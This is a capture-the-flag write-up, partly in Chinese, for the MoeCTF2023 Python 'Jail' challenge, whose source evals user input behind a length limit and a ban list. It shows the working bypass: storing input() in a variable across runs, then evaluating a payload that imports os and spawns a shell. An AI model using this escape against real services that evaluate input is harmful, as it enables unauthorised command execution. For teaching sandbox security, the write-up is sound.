```python
import re
BANLIST = ['breakpoint']
BANLIST_WORDS = '|'.join(f'({WORD})' for WORD in BANLIST)
print("Welcome to the MoeCTF2023 Jail challenge.It's time to work on this calc challenge.")
print("Enter your expression and I will evaluate it for you.")
user_input_data = input("> ")
if len(user_input_data)>12:
    print("Oh hacker! Bye~")
    exit(0)
if re.findall(BANLIST_WORDS, user_input_data, re.I):
    raise Exception('Blacklisted word detected! you are hacker!')
print('Answer result: {}'.format(eval(user_input_data)))
```

需要长度小于12且不是`breakpoint`，还记得之前扒下来的`server.py`吗，这就派上用场了（），仔细观察，发现多次运行会保留本地变量，于是我们可以多次运行来变相绕过长度限制
```

  __  __  ___        _____        _        _                _                         _                _ ____  
 |  \/  |/ _ \      / ____| ____ | |      | |              (_)                       | |              | |___ \ 
 | \  / | | | | ___| |     / __ \| | ___  | |__   ___  __ _ _ _ __  _ __   ___ _ __  | | _____   _____| | __) |
 | |\/| | | | |/ _ \ |    / / _` | |/ __| | '_ \ / _ \/ _` | | '_ \| '_ \ / _ \ '__| | |/ _ \ \ / / _ \ ||__ < 
 | |  | | |_| |  __/ |___| | (_| | | (__  | |_) |  __/ (_| | | | | | | | |  __/ |    | |  __/\ V /  __/ |___) |
 |_|  |_|\___/ \___|\_____\ \__,_|_|\___| |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|    |_|\___| \_/ \___|_|____/ 
                           \____/                      __/ |                                                   
                                                      |___/                                                                                                                                                        

| Options: 
|       [G]et Challenge Source Code 
|       [E]nter into Challenge 
|       [C]hallenge Description 
|       [Q]uit 

>>> e
Welcome to the MoeCTF2023 Jail challenge.It's time to work on this calc challenge.
Enter your expression and I will evaluate it for you.
> (l:=input)
Answer result: <built-in function input>
>>> e
Welcome to the MoeCTF2023 Jail challenge.It's time to work on this calc challenge.
Enter your expression and I will evaluate it for you.
> eval(l())
__import__("os").system("sh")
```